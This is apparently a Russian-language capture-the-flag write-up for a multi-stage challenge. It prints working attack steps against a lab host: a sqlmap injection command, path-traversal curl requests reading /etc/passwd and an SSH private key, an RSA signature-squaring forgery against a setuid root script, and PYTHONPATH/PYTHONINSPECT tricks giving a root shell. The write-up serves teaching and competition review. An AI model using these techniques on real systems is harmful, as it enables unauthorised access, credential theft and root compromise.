На видео: [4:02:20](https://vk.com/video-114366489_456239197?t=4h02m20s)

## Стадия 1 — REV либо WEB

### REV-путь
Декомпилировав .NET-приложение, можно увидеть, что для пользователя `admin` пароль подставляется как 100×MD5("admin")

### WEB-путь
Через SQL-инъекцию в /list можно вытащить пароль админа из базы

```sh
sqlmap -u 'http://95.179.184.108:20001/list?login=admin&password=admin'
```


## Стадия 2 — WEB либо DATA

### WEB-путь
Через читалку в /get можно скачать приватный SSH-ключ юзера imgstore

```sh
curl 'http://95.179.184.108:20001/get?login=admin&password=a113f7cc91116112d76a6ad4d1e5471c&image=../../../etc/passwd'
curl 'http://95.179.184.108:20001/get?login=admin&password=a113f7cc91116112d76a6ad4d1e5471c&image=../../../home/imgstore/.ssh/id_rsa'
```

### DATA-путь
Тот же приватный ключ SSH в стэше гита в бекапе у админа (backup_201905)

```sh
git stash pop
ls -al sign_keys.zip
```


## Стадия 3 — DATA либо PWN

### DATA-путь
Скрипт `/home/sysmon/system_monitoring.py` запускается под рутом, проверяет RSA-подпись команды. Гомоморфно возведя известную подпись в квадрат, можно добиться выполнения несуществующей команды, и создать файл с таким названием в PATH.

```sh
imgstore@b-final-1:/home/sysmon$ python
>>> cmd = '/bin/netstat -apntu'
>>> sig = base64.b64decode('WbdzUJdGJ2eC2W17lYatbdzmEFWZEVyL1LUUnA9/9gt80T6VGlpaSHgLgAcwGt6vY1vP3uH3EbmCOmA9JqgYSA==')
>>> check_rsa_signature(cmd, str2num(sig))
True
>>> newCmd = num2str(str2num(cmd) ** 2)
>>> newSig = num2str(str2num(sig) ** 2)
>>> check_rsa_signature(newCmd, str2num(newSig))
True
>>> newCmd
'\x08\xc5H\x8bY2l\x1b\xcao\x90\x88\x0b[Z\x95\xd1\x9dS8\xd0~c\xd1k\xff\xa4\xa7\xe4n_F88\xa9\x86=y'
>>> base64.b64encode(newSig)
'H3ERpBpYjvo7m7bxQ/Gif0HU1IO9XAJv4FdO8FpbscBw1mh0s6AQeP5oEmt2TTJ8egHS4ty3wfbhfDpl+2iDlcYn5ukLrBahaX7Wuah05c7RNux9ei36Qla7WB3zOHevGj1xSyw93fvkio+5mu1y1kVZLn94QtB9pMfn5UDNlEA='

imgstore@b-final-1:/home/sysmon$ ./suid_system_monitoring $'\x08\xc5H\x8bY2l\x1b\xcao\x90\x88\x0b[Z\x95\xd1\x9dS8\xd0~c\xd1k\xff\xa4\xa7\xe4n_F88\xa9\x86=y' H3ERpBpYjvo7m7bxQ/Gif0HU1IO9XAJv4FdO8FpbscBw1mh0s6AQeP5oEmt2TTJ8egHS4ty3wfbhfDpl+2iDlcYn5ukLrBahaX7Wuah05c7RNux9ei36Qla7WB3zOHevGj1xSyw93fvkio+5mu1y1kVZLn94QtB9pMfn5UDNlEA=
[+] Security check passed
sh: 1:▒H▒Y2lo▒▒
               [Z▒ѝS8▒~c▒k▒▒▒▒n_F88▒▒=y: not found
imgstore@b-final-1:/home/sysmon$ cd /tmp
imgstore@b-final-1:/tmp$ echo /bin/sh > $'\x08\xc5H\x8bY2l\x1b\xcao\x90\x88\x0b[Z\x95\xd1\x9dS8\xd0~c\xd1k\xff\xa4\xa7\xe4n_F88\xa9\x86=y'
imgstore@b-final-1:/tmp$ chmod +x $'\x08\xc5H\x8bY2l\x1b\xcao\x90\x88\x0b[Z\x95\xd1\x9dS8\xd0~c\xd1k\xff\xa4\xa7\xe4n_F88\xa9\x86=y'
imgstore@b-final-1:/tmp$ export PATH=".:$PATH"
imgstore@b-final-1:/tmp$ /home/sysmon/suid_system_monitoring $'\x08\xc5H\x8bY2l\x1b\xcao\x90\x88\x0b[Z\x95\xd1\x9dS8\xd0~c\xd1k\xff\xa4\xa7\xe4n_F88\xa9\x86=y' H3ERpBpYjvo7m7bxQ/Gif0HU1IO9XAJv4FdO8FpbscBw1mh0s6AQeP5oEmt2TTJ8egHS4ty3wfbhfDpl+2iDlcYn5ukLrBahaX7Wuah05c7RNux9ei36Qla7WB3zOHevGj1xSyw93fvkio+5mu1y1kVZLn94QtB9pMfn5UDNlEA=
[+] Security check passed
# id
uid=0(root) gid=1002(imgstore) groups=1002(imgstore)
#
```

### PENTEST-путь
Скрипт `/home/sysmon/system_monitoring.py` запускается под рутом, а питон обрабатывает интересные енв-вары.

```sh
imgstore@b-final-1:/tmp$ echo 'import os; os.system("/bin/sh")' > base64.py
imgstore@b-final-1:/tmp$ PYTHONPATH=. /home/sysmon/suid_system_monitoring
# id
uid=0(root) gid=1002(imgstore) groups=1002(imgstore)
#
```

или (© groke)

```sh
imgstore@b-final-1:/tmp$ PYTHONINSPECT=1 /home/sysmon/suid_system_monitoring
USAGE: /home/sysmon/system_monitoring.py 'command' 'signature'
Traceback (most recent call last):
  File "/home/sysmon/system_monitoring.py", line 28, in <module>
    exit()
  File "/usr/lib/python2.7/site.py", line 366, in __call__
    raise SystemExit(code)
SystemExit: None
>>> import os
>>> os.system("/bin/sh")
# id
uid=0(root) gid=1002(imgstore) groups=1002(imgstore)
#
```

### PWN-путь
С помощью форматной строчки ликнуть базу бинаря, собрать ROP, с помощью `gets` переехать рет-адрес.
